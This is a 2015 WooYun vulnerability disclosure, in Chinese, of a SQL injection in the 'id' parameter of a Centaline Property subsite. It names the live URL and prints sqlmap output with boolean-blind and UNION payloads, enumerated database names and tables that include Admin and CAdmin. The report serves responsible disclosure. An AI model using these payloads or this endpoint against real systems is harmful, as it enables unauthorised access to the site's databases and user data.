wybug_title: 中原地产某分站SQL注入一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-17：	细节已通知厂商并且等待厂商处理中									2015-07-21：	厂商已经确认，细节仅向厂商公开									2015-07-31：	细节向核心白帽子及相关领域专家公开									2015-08-10：	细节向普通白帽子公开									2015-08-20：	细节向实习白帽子公开									2015-09-06：	细节向公众公开  简要描述： RT 详细说明：  中原地产某分站SQL注入一枚注入点：http://hn.centanet.com/view.aspx?id=13

44个库，前三个如下
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=12 AND 5540=5540    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: id=-3520 UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(106)+CHAR(72)+CHAR(106)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(114)+CHAR(99)+CHAR(102)+CHAR(79)+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[19:46:17] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[19:46:17] [INFO] fetching database names[19:46:17] [INFO] the SQL query used returns 44 entries[19:46:18] [INFO] retrieved: AddWater[19:46:18] [INFO] retrieved: app[19:46:18] [INFO] retrieved: BySiteavailable databases [42]:                                                      [*] AddWater[*] app[*] BySite[19:47:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hn.centanet.com'[*] shutting down at 19:47:08root@Antique:~#


   漏洞证明：  

表有19个  很明显的Admin跟User等信息<code>sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=12 AND 5540=5540    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: id=-3520 UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(106)+CHAR(72)+CHAR(106)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(114)+CHAR(99)+CHAR(102)+CHAR(79)+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[20:11:12] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[20:11:12] [INFO] fetching tables for database: centawebsite01[20:11:13] [INFO] the SQL query used returns 19 entries[20:11:13] [INFO] starting 7 threads[20:11:13] [INFO] retrieved: dbo.About[20:11:13] [INFO] retrieved: dbo.Admin[20:11:13] [INFO] retrieved: dbo.CAdmin[20:11:13] [INFO] retrieved: dbo.CompanyADDatabase: centawebsite01                                                       [19 tables]+---------------+| About         || Admin         || ArticlesClass || ArticlesClass || BBS           || CAdmin        || CUser         |+---------------+<code>   修复方案：  过滤   版权声明：转载请注明来源 Antique@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-07-21 15:25 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
